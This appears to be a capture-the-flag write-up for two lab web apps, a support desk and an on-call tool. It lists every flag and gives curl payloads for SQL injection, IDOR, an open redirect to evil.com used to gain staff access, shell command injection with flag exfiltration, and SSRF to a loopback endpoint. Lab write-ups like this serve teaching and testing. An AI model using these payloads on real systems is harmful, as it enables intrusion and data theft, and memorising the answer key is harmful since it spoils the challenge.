# Support Desk & On-Call Shadow — Writeup

Deployed challenges. Base URLs:

- **Challenge 1 (Support desk)** → `http://challenge1.localhost`
- **Challenge 2 (On-call shadow)** → `http://challenge2.localhost`

Flags are seeded from `TEAM_FLAGS`:

| # | Challenge | Flag |
|---|---|---|
| c1-1 | Support desk · SQLi | `FLAG{sqli_thr0ugh_th3_l1k3}` |
| c1-2 | Support desk · IDOR | `FLAG{1d0r_0p3n_th3_t1ck3t}` |
| c1-3 | Support desk · redirect | `FLAG{r3d1r3ct_tru5t_br0k3n}` |
| c2-1 | On-call · RCE | `FLAG{rce_3x3c_0n_th3_sh4d0w}` |
| c2-2 | On-call · SSRF | `FLAG{ssrf_p0rt4l_t0_th3_0n_c4ll}` |

---

## Challenge 1 — Support desk (3 flags)

### c1-1 · SQL injection — `/api/tickets/search/`
`q` is interpolated directly into a raw `LIKE`. Break out and dump every ticket.

```bash
curl -G "http://challenge1.localhost/api/tickets/search/" \
  --data-urlencode "q=' OR 1=1 --"
```
The staff-only `P0 archive sync stalled` ticket leaks first; its `summary` holds the flag. Note the returned `id` — that's the internal ticket handle for c1-2.

### c1-2 · IDOR — `/api/tickets/<id>/`
Ticket detail looks up by `external_id` with **no queue/ownership scope**.

```bash
curl "http://challenge1.localhost/api/tickets/<leaked_id>/"
```
The P0 incident thread body holds the flag and mentions the staff page for c1-3.

### c1-3 · Open redirect / workflow trust — `/back/?next=...` then `/staff/handover/<id>/`
The staff page is `403` on direct access, but `/back/` grants a `staff_nav` cookie whenever `next` starts with `/staff/`, and `next` is attacker-controlled.

```bash
curl -s -o /dev/null -w "%{http_code}\n" \
  "http://challenge1.localhost/staff/handover/<leaked_id>/"        # 403 (blocked)

# prove the redirect is genuinely open:
curl -s -o /dev/null -w "%{http_code}\n" \
  "http://challenge1.localhost/back/?next=https://evil.com"        # 302 -> evil.com

# grant yourself staff, then read the page:
curl -s -c /tmp/cj "http://challenge1.localhost/back/?next=/staff/handover/<leaked_id>/"
curl -s -b /tmp/cj "http://challenge1.localhost/staff/handover/<leaked_id>/"   # flag 3
```

---

## Challenge 2 — On-call shadow (2 flags)

### c2-1 · RCE — `/api/diag/run/`
`target` is interpolated into `python3 <diag.py> {target}` under `shell=True`. The diag script only accepts `api|worker|database|scheduler`, but the shell lets you chain commands.

The seeder writes `FLAGS[0]` to `/app/flag.txt` (the `FLAG_PATH`). The preview endpoint **truncates** the output at the flag midpoint, so a direct `cat` only shows the first half — push the full token out via the app's own webhook tester or a listener:

```bash
# 1. confirm RCE: chained command (first half of the flag appears in `preview`)
curl -G "http://challenge2.localhost/api/diag/run/" \
  --data-urlencode "target=api; cat /app/flag.txt"

# 2. exfiltrate the full flag: copy it under static, then fetch it back
curl -G "http://challenge2.localhost/api/diag/run/" \
  --data-urlencode "target=api; cp /app/flag.txt /app/static/f.txt"
curl "http://challenge2.localhost/static/f.txt"
# (or have the command POST the token to a listener you control)
```

### c2-2 · SSRF — `/webhooks/test/`
`url` is fetched server-side with no allowlist. Hit the loopback-only metrics endpoint (which returns `FLAGS[1]`) from inside the app:

```bash
curl -G "http://challenge2.localhost/webhooks/test/" \
  --data-urlencode "url=http://127.0.0.1:8000/internal/oncall-metrics/"
```

---

## Notes

- Both apps expose a static hint list at `/api/hints/` if you get stuck.
- Each flag is an independent `FLAG{...}` — submit them individually.
- Survive a challenge restart: the DB is re-seeded on boot from `TEAM_FLAGS`, so flags stay constant across restarts.
